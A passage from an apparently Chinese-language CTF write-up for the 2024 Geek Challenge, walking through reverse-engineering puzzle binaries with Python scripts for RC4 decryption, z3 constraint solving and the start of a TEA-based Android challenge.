<span class="number">227</span>, <span class="number">189</span>, <span class="number">226</span>, <span class="number">97</span>, <span class="number">228</span>, <span class="number">99</span>, <span class="number">234</span>, <span class="number">255</span>, <span class="number">254</span>, <span class="number">9</span>, <span class="number">249</span>, <span class="number">195</span>, <span class="number">206</span>, <span class="number">158</span>, <span class="number">37</span>, <span class="number">106</span>, <span class="number">76</span>, <span class="number">220</span>, <span class="number">19</span>, <span class="number">240</span>, <span class="number">131</span>, <span class="number">59</span>, <span class="number">36</span>, <span class="number">219</span>, <span class="number">221</span>, <span class="number">127</span>, <span class="number">239</span>, <span class="number">140</span>, <span class="number">62</span>, <span class="number">225</span>, <span class="number">38</span>, <span class="number">111</span>, <span class="number">146</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">150</span>, <span class="number">208</span>, <span class="number">180</span>, <span class="number">231</span>, <span class="number">248</span>, <span class="number">95</span>, <span class="number">120</span>, <span class="number">242</span>, <span class="number">170</span>, <span class="number">68</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">90</span>, <span class="number">236</span>, <span class="number">166</span>, <span class="number">123</span>, <span class="number">8</span>, <span class="number">192</span>, <span class="number">46</span>, <span class="number">155</span>, <span class="number">132</span>, <span class="number">85</span>, <span class="number">156</span>, <span class="number">174</span>, <span class="number">101</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">83</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">70</span>, <span class="number">171</span>, <span class="number">12</span>, <span class="number">31</span>, <span class="number">89</span>, <span class="number">126</span>, <span class="number">229</span>, <span class="number">179</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">26</span>, <span class="number">209</span>, <span class="number">164</span>, <span class="number">103</span>, <span class="number">107</span>, <span class="number">186</span>, <span class="number">135</span>, <span class="number">115</span>, <span class="number">75</span>, <span class="number">162</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">187</span>, <span class="number">44</span>, <span class="number">112</span>, <span class="number">147</span>, <span class="number">172</span>, <span class="number">15</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">181</span>, <span class="number">33</span>, <span class="number">133</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">28</span>, <span class="number">159</span>, <span class="number">129</span>, <span class="number">92</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">27</span>, <span class="number">22</span>, <span class="number">210</span>, <span class="number">199</span>, <span class="number">224</span>, <span class="number">218</span>, <span class="number">88</span>, <span class="number">169</span>, <span class="number">30</span>, <span class="number">215</span>, <span class="number">194</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">214</span>, <span class="number">45</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">102</span>, <span class="number">250</span>, <span class="number">48</span>, <span class="number">173</span>, <span class="number">153</span>, <span class="number">139</span>, <span class="number">119</span>, <span class="number">65</span>, <span class="number">151</span>, <span class="number">34</span>, <span class="number">184</span>, <span class="number">178</span>, <span class="number">211</span>, <span class="number">71</span>, <span class="number">198</span>, <span class="number">121</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">244</span>, <span class="number">63</span>, <span class="number">17</span>, <span class="number">43</span>, <span class="number">222</span>, <span class="number">238</span>, <span class="number">243</span>, <span class="number">245</span>, <span class="number">175</span>, <span class="number">165</span>, <span class="number">134</span>, <span class="number">145</span>, <span class="number">190</span>, <span class="number">142</span>, <span class="number">143</span>, <span class="number">232</span>, <span class="number">230</span>, <span class="number">177</span>, <span class="number">78</span>, <span class="number">55</span>, <span class="number">213</span>, <span class="number">252</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">66</span>, <span class="number">202</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">110</span>, <span class="number">163</span>, <span class="number">137</span>, <span class="number">21</span>, <span class="number">109</span>, <span class="number">3</span>, <span class="number">138</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">118</span>, <span class="number">203</span>, <span class="number">197</span>, <span class="number">241</span>, <span class="number">108</span>, <span class="number">185</span>, <span class="number">23</span>, <span class="number">100</span>, <span class="number">104</span>, <span class="number">233</span>, <span class="number">86</span>, <span class="number">41</span>, <span class="number">144</span>, <span class="number">237</span>, <span class="number">116</span>, <span class="number">13</span>, <span class="number">235</span>, <span class="number">176</span>, <span class="number">161</span>, <span class="number">148</span>, <span class="number">128</span>, <span class="number">201</span>, <span class="number">124</span>, <span class="number">183</span>, <span class="number">40</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">35</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">39</span>, <span class="number">152</span>, <span class="number">67</span>, <span class="number">125</span>, <span class="number">191</span>, <span class="number">79</span>, <span class="number">18</span>, <span class="number">52</span>, <span class="number">168</span>, <span class="number">217</span>, <span class="number">87</span>, <span class="number">51</span>, <span class="number">154</span>, <span class="number">1</span>, <span class="number">84</span>, <span class="number">47</span>, <span class="number">60</span>, <span class="number">98</span>, <span class="number">56</span>, <span class="number">251</span>, <span class="number">130</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">25</span>, <span class="number">93</span>, <span class="number">182</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">204</span>, <span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>然后继续解密<code>sub_14A6</code>这个函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">s2_1 = <span class="string">&#x27;0xA67A02C9047D5B94&#x27;</span></span><br><span class="line">s2_2 = <span class="string">&#x27;0x7EF9680DBC980739&#x27;</span></span><br><span class="line">s2_3 = <span class="string">&#x27;0x7104F81698BFBD08&#x27;</span></span><br><span class="line">s2_4 = <span class="string">&#x27;0x61DB8498B686155F&#x27;</span></span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2_1)//<span class="number">2</span>-<span class="number">1</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(s2_1[-<span class="number">2</span>-<span class="number">2</span>*i:<span class="built_in">len</span>(s2_1)-<span class="number">2</span>*i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2_1)//<span class="number">2</span>-<span class="number">1</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(s2_2[-<span class="number">2</span>-<span class="number">2</span>*i:<span class="built_in">len</span>(s2_1)-<span class="number">2</span>*i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2_1)//<span class="number">2</span>-<span class="number">1</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(s2_3[-<span class="number">2</span>-<span class="number">2</span>*i:<span class="built_in">len</span>(s2_1)-<span class="number">2</span>*i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2_1)//<span class="number">2</span>-<span class="number">1</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(s2_4[-<span class="number">2</span>-<span class="number">2</span>*i:<span class="built_in">len</span>(s2_1)-<span class="number">2</span>*i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v6 = (v6 + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">    v7 = (v7 + v9[v6])%<span class="number">256</span></span><br><span class="line">    v5 = v9[v6]&amp;<span class="number">0xFF</span></span><br><span class="line">    v9[v6] = v9[v7]&amp;<span class="number">0xFF</span></span><br><span class="line">    v9[v7] = v5&amp;<span class="number">0xFF</span></span><br><span class="line">    c[i] ^= v9[(v9[v6]+v9[v7])&amp;<span class="number">0xFF</span>]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    c[i] ^= <span class="number">0x14</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;we1come_t0_Geek&#x27;s_3asy_rc4!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="我勒个z3啊"><a class="markdownIt-Anchor" href="#我勒个z3啊"></a> 我勒个z3啊</h2>
<ul>
<li>拿到题目运行一下，发现要先输入密钥，再输入flag</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103104343881.png" alt="image-20241103104343881"></p>
<ul>
<li>然后使用IDA进行反编译该文件，然后再看代码，发现了<code>check_key</code>函数以及后面<code>check_key</code>函数后面的函数都是检查flag的函数</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103105117665.png" alt="image-20241103105117665"></p>
<ul>
<li>查看一下<code>check_key</code>函数，发现是将指定字符串转化为特定字符，然后再与<code>str2</code>做比较</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103105254411.png" alt="image-20241103105254411"></p>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103105352871.png" alt="image-20241103105352871"></p>
<ul>
<li>所以可以写出解密代码，得到key后运行程序输入，结果为密钥正确</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x2A</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x26</span>, <span class="number">0x11</span>, <span class="number">0x0A</span>,</span><br><span class="line">  <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x0E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x0E</span>]</span><br><span class="line">b = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?_&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    key += b[i]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># Geek___Challenge</span></span><br></pre></td></tr></table></figure>
<ul>
<li>接下来输入flag，所以要查看加密flag相关的函数，发现<code>sub_401AAC</code>对flag做了加密，然后<code>sub_40179A</code>对flag做了判断</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103105950605.png" alt="image-20241103105950605"></p>
<ul>
<li>查看<code>sub_401AAC</code>函数就会发现还有一个函数对flag进行了操作</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103110322497.png" alt="image-20241103110322497"></p>
<ul>
<li>然后查看<code>sub_4019EB</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103110408824.png" alt="image-20241103110408824"></p>
<ul>
<li>再来查看检查flag的这个函数<code>sub_40179A</code>，发现加密后的密文保存在<code>dword_4040A0</code>这边</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103110439617.png" alt="image-20241103110439617"></p>
<ul>
<li>所以我们要先用<code>z3</code>线性约束利用<code>dword_4040A0</code>里面的密文，求解出加密后的flag对应的值，直接使用<code>shift+E</code>提取该值</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241103111302127.png" alt="image-20241103111302127"></p>
<ul>
<li>使用z3求解出flag</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">c  =[<span class="number">411</span>,  <span class="number">275</span>,  <span class="number">393</span>,  <span class="number">457</span>,  <span class="number">592</span>,  <span class="number">1334</span>,  <span class="number">1246</span>,  <span class="number">444</span>,  <span class="number">1051</span>,  <span class="number">1828</span>,  <span class="number">1744</span>,  <span class="number">1185</span>,  <span class="number">1605</span>,  <span class="number">1141</span>,  <span class="number">1226</span>,  <span class="number">1676</span>,  <span class="number">997</span>,  <span class="number">455</span>,  <span class="number">829</span>,  <span class="number">1463</span>,  <span class="number">653</span>,  <span class="number">580</span>,  <span class="number">782</span>,  <span class="number">657</span>,  <span class="number">625</span>,  <span class="number">769</span>,  <span class="number">1119</span>,  <span class="number">1135</span>,  <span class="number">1303</span>,  <span class="number">1054</span>,  <span class="number">1062</span>,  <span class="number">1205</span>]</span><br><span class="line">x1,x2,x3,x4 = Ints(<span class="string">&#x27;x1 x2 x3 x4&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>):</span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add(x1 + x2*<span class="number">8</span> + x3 *<span class="number">6</span> + x4 == c[<span class="number">0</span>+i*<span class="number">4</span>])</span><br><span class="line">    solver.add(x1 + x2 + x3 * <span class="number">8</span> + x4 * <span class="number">6</span> == c[<span class="number">1</span> + i * <span class="number">4</span>])</span><br><span class="line">    solver.add(x1*<span class="number">6</span> + x2 + x3 + x4*<span class="number">8</span> == c[<span class="number">2</span> + i * <span class="number">4</span>])</span><br><span class="line">    solver.add(x1*<span class="number">8</span> + x2 * <span class="number">6</span> + x3 + x4 == c[<span class="number">3</span> + i * <span class="number">4</span>])</span><br><span class="line">    solver.check()</span><br><span class="line">    <span class="built_in">print</span>(solver.model())</span><br><span class="line">[x4 = <span class="number">26</span>, x3 = <span class="number">7</span>, x2 = <span class="number">40</span>, x1 = <span class="number">23</span>]</span><br><span class="line">[x4 = <span class="number">125</span>, x3 = <span class="number">69</span>, x2 = <span class="number">3</span>, x1 = <span class="number">29</span>]</span><br><span class="line">[x4 = <span class="number">118</span>, x3 = <span class="number">125</span>, x2 = <span class="number">9</span>, x1 = <span class="number">111</span>]</span><br><span class="line">[x4 = <span class="number">54</span>, x3 = <span class="number">74</span>, x2 = <span class="number">126</span>, x1 = <span class="number">99</span>]</span><br><span class="line">[x4 = <span class="number">5</span>, x3 = <span class="number">28</span>, x2 = <span class="number">89</span>, x1 = <span class="number">112</span>]</span><br><span class="line">[x4 = <span class="number">70</span>, x3 = <span class="number">9</span>, x2 = <span class="number">63</span>, x1 = <span class="number">25</span>]</span><br><span class="line">[x4 = <span class="number">48</span>, x3 = <span class="number">43</span>, x2 = <span class="number">26</span>, x1 = <span class="number">111</span>]</span><br><span class="line">[x4 = <span class="number">69</span>, x3 = <span class="number">60</span>, x2 = <span class="number">102</span>, x1 = <span class="number">58</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>接下来开始逆加密算法，在逆算法的过程中这个位置卡了很久，而且思维定势了，后来逐渐理解了该算法的过程之后就写出了对应的解密算法了，总之还是算法敲少了</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104000735756.png" alt="image-20241104000735756"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = [<span class="number">0x2A</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x26</span>, <span class="number">0x11</span>, <span class="number">0x0A</span>,<span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x0E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x0E</span>]</span><br><span class="line">b = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?_&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    key += b[i]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">c  =[<span class="number">411</span>,  <span class="number">275</span>,  <span class="number">393</span>,  <span class="number">457</span>,  <span class="number">592</span>,  <span class="number">1334</span>,  <span class="number">1246</span>,  <span class="number">444</span>,  <span class="number">1051</span>,  <span class="number">1828</span>,  <span class="number">1744</span>,  <span class="number">1185</span>,  <span class="number">1605</span>,  <span class="number">1141</span>,  <span class="number">1226</span>,  <span class="number">1676</span>,  <span class="number">997</span>,  <span class="number">455</span>,  <span class="number">829</span>,  <span class="number">1463</span>,  <span class="number">653</span>,  <span class="number">580</span>,  <span class="number">782</span>,  <span class="number">657</span>,  <span class="number">625</span>,<span class="number">769</span>,<span class="number">1119</span>,<span class="number">1135</span>,<span class="number">1303</span>,<span class="number">1054</span>,<span class="number">1062</span>, <span class="number">1205</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line">x1,x2,x3,x4 = Ints(<span class="string">&#x27;x1 x2 x3 x4&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>):</span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add(x1 + x2*<span class="number">8</span> + x3 *<span class="number">6</span> + x4 == c[<span class="number">0</span>+i*<span class="number">4</span>])</span><br><span class="line">    solver.add(x1 + x2 + x3 * <span class="number">8</span> + x4 * <span class="number">6</span> == c[<span class="number">1</span> + i * <span class="number">4</span>])</span><br><span class="line">    solver.add(x1*<span class="number">6</span> + x2 + x3 + x4*<span class="number">8</span> == c[<span class="number">2</span> + i * <span class="number">4</span>])</span><br><span class="line">    solver.add(x1*<span class="number">8</span> + x2 * <span class="number">6</span> + x3 + x4 == c[<span class="number">3</span> + i * <span class="number">4</span>])</span><br><span class="line">    solver.check()</span><br><span class="line">    a = solver.model()</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">flag = [<span class="number">23</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">26</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">125</span>,<span class="number">111</span>,<span class="number">9</span>,<span class="number">125</span>,<span class="number">118</span>,<span class="number">99</span>,<span class="number">126</span>,<span class="number">74</span>,<span class="number">54</span>,<span class="number">112</span>,<span class="number">89</span>,<span class="number">28</span>,<span class="number">5</span>,<span class="number">25</span>,<span class="number">63</span>,<span class="number">9</span>,<span class="number">70</span>,<span class="number">111</span>,<span class="number">26</span>,<span class="number">43</span>,<span class="number">48</span>,<span class="number">58</span>,<span class="number">102</span>,<span class="number">60</span>,<span class="number">69</span>]</span><br><span class="line"><span class="comment">#flag = [26,7,40,23,125,69,3,29,118,125,9,111,54,74,126,99,5,28,89,112,70,9,63,25,48,43,26,111,69,60,102,58]</span></span><br><span class="line">key = <span class="string">&#x27;Geek___Challenge&#x27;</span></span><br><span class="line"></span><br><span class="line">v2 = <span class="built_in">len</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(v2)</span><br><span class="line">result = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    flag[i] ^= <span class="built_in">ord</span>(key[(<span class="number">47</span> - i) % <span class="number">16</span>])</span><br><span class="line">    flag[i] ^= flag[(v2 + i - <span class="number">1</span>) % v2]</span><br><span class="line">    flag[i] ^= i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        v2 = flag[<span class="number">4</span> * i + <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            flag[<span class="number">4</span> * i + k + <span class="number">1</span>] = flag[<span class="number">4</span> * i + k]</span><br><span class="line">        flag[<span class="number">4</span>*i] = v2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;Wow!!_Y0u_4r3_9o0d_At_r3$!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ezzzz"><a class="markdownIt-Anchor" href="#ezzzz"></a> ezzzz</h2>
<ul>
<li>下载附件，看到是一个安卓逆向，直接使用<code>jadx</code>反编译该代码</li>
<li>我们会发现在主类这边调用了<code>Enc</code>对象中的<code>encrypt</code>方法，该方法传入字符串为参数（该字符串就是我们输入的字符串），加密后的数据会与<code>R</code>对象中的子对象<code>String</code>，与<code>target</code>这个int值对应的资源ID的字符串进行对比，如果对比成功则<code>&quot;Wow!You are right!!!&quot;</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104002449721.png" alt="image-20241104002449721"></p>
<ul>
<li>接下来我查看一下这个资源ID对应的字符串，这个资源ID对应的字符串在<code>res/values/strings.xml</code>里面，这里直接搜索<code>target</code>即可找到,但是找到的是这么一长串数字，应该是被hash加密或者是被编码过了，所以这时我们只能从对应的加密那边入手（这里我还并不知道该字符串就是明文加密后要对比的字符串，还是该字符串经过了加密处理）</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104003558988.png" alt="image-20241104003558988"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;string name=<span class="string">&quot;target&quot;</span>&gt;f1f186b25a96c782e6c63a0b70b61b5ced6bf84889700d6b09381b5ccb2f24fab1c79e796d822d9cdcc55f760f780e750d65c4afb89084a9e978c3827a8dd81091f28df3a84dbacab4d75f75f19af8e5b90f80fcfc10a5c3d20679fb2bc734c8ccb31c921ac52ad3e7f922b72e24d923fb4ce9f53548a9e571ebc25adf38862e10059186327509463dd4d54c905abc36c26d5312d2cd42c0772d99e50cd4c4665c3178d63a7ffe71ada251c070568d5a5798c2921ec0f7fc3ae9d8418460762930ca6a2dccef51d2a1a8085491b0f82d686ca34774c52d0f0f26449fc28d362c86f3311b8adc4fb1a4497e34e0f0915d&lt;/string&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>接下来逆向加密的那个对象，了解一下加密过程，然后再编写解密脚本</p>
</li>
<li>
<p>首先分析主类调用的这个方法，这里也要注意一下上方的<code>DELTA</code>，综合特征显示应该是个TEA加密</p>
<ul>
<li>先将输入的明文转为逐个字符转为整型，并存储在整型数组<code>iArr</code>里面</li>
<li>在将字符串<code>GEEK</code>转化为整型，存如数组<code>iArr2</code>里面</li>
<li>然后定义整型数组<code>iArr3</code>,该整型数组每次取俩个<code>iArr</code>里面的元素，并且调用<code>encrypt</code>方法传入<code>iArr3</code>和<code>iArr2</code>进行加密，然后更新<code>iArr</code>数组里面的值</li>
<li>之后<code>new</code>一个<code>StringBuilder</code>对象，将加密后的整型数组<code>iArr</code>以16进制转化为字符串的形式拼接后输出，然后并返回该拼接后的字符串，之后就与<code>target</code>里面的字符串做对比（这时我更偏向于认为target字符串是加密后的十六进制字符串，而不是字符串对应的hash值）</li>
<li>这里还要注意，这个方法就是将数组对应的整型转换为16进制，但是会有填充到8个字符，例如：<code>255</code>输出会变成<code>000000ff</code>。所以俩个字符追加上去就会变成<code>00000098000001c7</code>，所以得到的字符是8个字符转换为一个数组元素</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sb.append(String.format(&quot;%08x&quot;,Integer.valueOf(iArr[i5])))</span><br></pre></td></tr></table></figure>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104004307519.png" alt="image-20241104004307519"></p>
<ul>
<li>然后再来查看<code>encrypt</code>这个方法，很典型的一个茶加密</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104005812935.png" alt="image-20241104005812935"></p>
<ul>
<li>直接开逆，这里密钥应该就是<code>GEEK</code>这个字符串，加密过程中还有使用<code>int DELTA = -1640531527</code></li>
